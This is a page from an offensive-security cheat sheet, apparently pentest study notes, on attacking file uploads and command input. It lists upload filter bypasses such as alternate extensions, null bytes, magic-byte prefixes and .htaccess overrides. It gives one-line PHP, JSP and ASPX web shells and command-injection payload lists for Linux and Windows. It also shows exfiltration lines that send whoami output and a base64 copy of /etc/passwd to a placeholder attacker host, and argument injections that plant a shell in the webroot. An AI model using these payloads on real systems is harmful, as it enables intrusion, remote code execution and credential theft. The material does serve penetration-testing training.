# File paths, uploads, and command input

LFI / traversal: [lfi.md](lfi.md) · [rfi.md](rfi.md)

## File upload
Find the saved path/handler. Upload success ≠ execution; request the file with a harmless marker. Change one filter at a time — extension, `Content-Type`, magic bytes and content are usually checked separately.

| Filter | Try |
| --- | --- |
| `Content-Type` check | Keep the real file, set the part header to `Content-Type: image/jpeg` in the request |
| Extension denylist | `.phtml`, `.php5`, `.phar`, `.pHp`, double extensions; IIS: `.aspx`, `.asp`, `.ashx`, `.asa`, `.cer`; Java: `.jsp`, `.jspx` |
| Extension allowlist | `shell.php.jpg`, `shell.jpg.php`, `shell.php%00.jpg` (old PHP), `shell.php.` / `shell.php::$DATA` (Windows), `shell.php;.jpg` (old IIS) |
| Magic bytes check | Prefix `GIF89a;` (image header) before the payload; valid image + PHP in metadata: `exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg` (then needs an execution route) |
| Filename used as path | `../../shell.php` in `filename=` to land outside the upload dir |
| Executable dir blocked | Write `.htaccess` (Apache: `AddType application/x-httpd-php .jpg`) or `web.config` (IIS) first, then the file |

- Upload response, redirect or page source shows the saved name/path; if renamed, find the rule (hash, timestamp, user ID).
- Path traversal in the filename also reaches non-web targets: `../../../../home/<USER>/.ssh/authorized_keys` (needs correct key, mode and the file's owner) → [file-write](../linux/file-write.md#what-the-primitive-gives-you).
- 500/blank page when requested ≠ not uploaded: check interpreter, `disable_functions`, syntax.

## Web shell sources
Drop a minimal shell to confirm execution, then pivot to a real reverse shell: [shells](../foothold/shells.md).
```bash
ls /usr/share/webshells/php /usr/share/webshells/aspx /usr/share/webshells/jsp 2>/dev/null
ls /usr/share/laudanum/ 2>/dev/null
```
```php
<?php system($_GET['c']); ?>
```
```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```
```aspx
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>
```
- Minimal shells avoid signature-based filters that catch `/usr/share/webshells` content verbatim; swap to the real reverse shell file once execution is confirmed.

## Command injection
Compare each payload against a baseline:

```text
; id
| id
&& id
$(id)
; sleep 5
```
- Blind: repeat `sleep 5` vs baseline, or callback.
- Space filter: `${IFS}` (shell context only).

## Out-of-band exfil and argument injection
Metacharacter filters (`;`, `|`, `&`) don't stop data leaving via a command's own arguments:
```bash
; curl http://<KALI>/$(whoami)
; curl http://<KALI>/$(cat /etc/passwd | base64 -w0)
; nslookup $(whoami).<KALI-DOMAIN>
```
- DNS exfil works even when outbound HTTP is firewalled; needs a domain you control resolving to `<KALI>` (or just watch `tcpdump -i <INTERFACE> port 53`).

Argument injection — the backend builds `curl`/`tar`/`git` from your input without a leading `--`, so a value starting with `-` is read as a flag, not data:
```bash
-o/var/www/html/shell.php http://<KALI>/shell.php    # curl: write the fetch straight into the webroot
--checkpoint=1 --checkpoint-action=exec=sh\ shell.sh  # tar: needs two injected args + a positional (archive creation only)
-u$({touch,/tmp/foo}) :x                              # git clone: needs a second positional argument too
```

## Windows command injection
Same baseline method; the separators differ:

```text
& whoami
&& whoami
| whoami
|| whoami
%0a whoami
; whoami            (PowerShell backend only)
```
- Blind timing: `& ping -n 6 127.0.0.1` (about 5 s); `& timeout /t 5`.
- Blind callback: `& nslookup <KALI>` / `& curl http://<KALI>:8000/probe` / `& certutil -urlcache -f http://<KALI>:8000/probe x`.
- Quote-aware: `"&whoami&"`. `cmd.exe` metacharacters need `^` to escape: `^&`.
- Linux filters: no space → `${IFS}`, `{cat,/etc/passwd}`, `cat<file`; blocked char → `$(printf '\x2f')`.
- Then a real shell: [shells](../foothold/shells.md), Windows download cradle: [file-transfer](../foothold/file-transfer.md).
